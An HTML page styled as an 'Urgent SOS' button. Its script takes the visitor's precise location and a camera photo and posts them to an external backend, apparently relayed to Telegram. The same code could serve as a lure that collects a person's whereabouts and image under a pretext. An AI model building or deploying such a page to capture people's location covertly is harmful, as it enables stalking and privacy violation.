<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Emergency Help</title>
  <!-- Load Tailwind CSS -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- Configure Tailwind to use Inter font and necessary colors -->
  <script>
    tailwind.config = {
      theme: {
        extend: {
          fontFamily: {
            sans: ['Inter', 'sans-serif'],
          },
          colors: {
            'emergency-red': '#C0392B',
            'status-green': '#27AE60',
          }
        }
      }
    }
  </script>
  <!-- Custom styles for the animation/shadow -->
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800&display=swap');
    #btn:hover {
      box-shadow: 0 10px 15px -3px rgba(192, 57, 43, 0.5), 0 4px 6px -2px rgba(192, 57, 43, 0.3);
    }
    #btn:active {
        transform: scale(0.98);
    }
  </style>
</head>
<body class="font-sans bg-gray-50 flex items-center justify-center min-h-screen p-4">

  <!-- Main Container Card -->
  <div class="w-full max-w-sm bg-white p-6 md:p-8 rounded-2xl shadow-2xl border border-red-100">

    <h1 class="text-4xl font-extrabold text-emergency-red mb-4 flex items-center justify-center">
        <!-- Emergency Icon -->
        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 mr-2 animate-pulse" viewBox="0 0 20 20" fill="currentColor">
            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
        </svg>
        <span>Urgent SOS</span>
    </h1>

    <p class="text-gray-600 mb-6 text-center text-lg">
      Tap the large button below to discreetly notify your emergency contact.
    </p>

    <!-- The Emergency Button -->
    <button id="btn" class="w-full h-20 text-xl font-bold tracking-wider uppercase 
                           bg-emergency-red text-white p-4 
                           border-b-4 border-red-900 rounded-xl shadow-lg 
                           transition duration-300 ease-in-out transform 
                           hover:bg-red-700 focus:outline-none focus:ring-4 focus:ring-red-300">
      <span class="flex items-center justify-center">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mr-3" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
            <path stroke-linecap="round" stroke-linejoin="round" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8" />
        </svg>
        Send Emergency Alert
      </span>
    </button>

    <!-- Status Message Area -->
    <div id="status" class="mt-6 text-center text-lg font-semibold text-gray-800 p-3 bg-red-50 border border-red-200 rounded-lg">
      Awaiting action...
    </div>
  </div>

<script>
// NOTE: The following code block is UNMODIFIED from the user's original input.
const BACKEND = "https://improved-waffle.onrender.com/send_data"; // ← your Render backend
const btn = document.getElementById('btn');
const status = document.getElementById('status');

function setStatus(t){ status.textContent = t; }

async function capturePhoto() {
  // Get camera stream and capture one frame
  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
  const video = document.createElement('video');
  video.srcObject = stream;
  await video.play();
  // small canvas to reduce size
  const canvas = document.createElement('canvas');
  canvas.width = 640;
  canvas.height = Math.round(video.videoHeight * (640 / video.videoWidth || 0.75));
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  // stop camera
  stream.getTracks().forEach(t => t.stop());
  // return data URL (base64)
  return canvas.toDataURL('image/jpeg', 0.8);
}

btn.addEventListener('click', async () => {
  try {
    btn.disabled = true;
    setStatus('Requesting location…');
    const pos = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 15000 });
    });
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    setStatus('Capturing photo…');
    const photoData = await capturePhoto(); // data URL
    setStatus('Sending to server…');
    const resp = await fetch(BACKEND, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ lat, lon, photo: photoData })
    });
    if (!resp.ok) {
      const err = await resp.text();
      throw new Error(err || resp.statusText);
    }
    // Update status to green success message
    status.className = 'mt-6 text-center text-lg font-semibold text-status-green p-3 bg-green-50 border border-green-200 rounded-lg';
    setStatus('✅ Alert sent! Check Telegram.');
  } catch (err) {
    console.error(err);
    // Update status to red error message
    status.className = 'mt-6 text-center text-lg font-semibold text-emergency-red p-3 bg-red-50 border border-red-200 rounded-lg';
    setStatus('❌ Error: ' + (err.message || err));
  } finally {
    btn.disabled = false;
  }
});
</script>
</body>
</html>
